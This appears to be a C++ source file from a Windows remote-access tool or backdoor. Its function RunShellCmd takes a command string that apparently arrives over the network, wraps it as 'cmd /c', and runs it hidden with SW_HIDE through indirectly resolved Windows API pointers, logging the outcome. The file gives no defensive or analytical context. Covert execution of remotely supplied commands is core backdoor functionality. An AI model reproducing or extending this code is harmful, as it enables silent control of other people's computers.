
#include <Windows.h>
#include "../api.h"
#include "../public.h"
#include "../network/NetWorkdata.h"
#include "../StrHelper.h"
#include <json/json.h>
#include "../StrHelper.h"
#include "../log.h"
#include "../StrHelper.h"
#include "../bootHelper.h"

DWORD  __stdcall RunShellCmd(char* szCmd)
{
	int iRet = 0;
	char szShowInfo[1024];

	unsigned int iCmdLen = lplstrlenA(szCmd);
	if (iCmdLen <= 0 || iCmdLen >= 1024)
	{
		delete[]szCmd;
		return FALSE;
	}

	string str = makeJsonFromTxt(szCmd);


	char szCmdOuptPutFileName[MAX_PATH] = { 0 };
	makeFullFileName(szCmdOuptPutFileName, CMD_OUTPUT_FILE_NAME);

	//char szExecCmdFormat[MAX_PATH] = "cmd %s >> \"%s\"";
	char szExecCmdFormat[MAX_PATH] = "cmd /c %s";

	char szCmdCommand[MAX_CMD_LIMIT_SIZE];
	//iRet = lpwsprintfA(szCmdCommand,szExecCmdFormat,stdcmd,szCmdOuptPutFileName);
	iRet = lpwsprintfA(szCmdCommand, szExecCmdFormat, str.c_str());
	iRet = lpWinExec(szCmdCommand, SW_HIDE);
	if (iRet <= 31)
	{
		wsprintfA(szShowInfo, "RunCmd:%s error code:%u\r\n", szCmdCommand, lpRtlGetLastWin32Error());
		writeLog(szShowInfo);
	}
	else {
		wsprintfA(szShowInfo, "RunCmd:%s ok\r\n", szCmdCommand);
		writeLog(szShowInfo);
	}
	delete[]szCmd;
	return TRUE;
}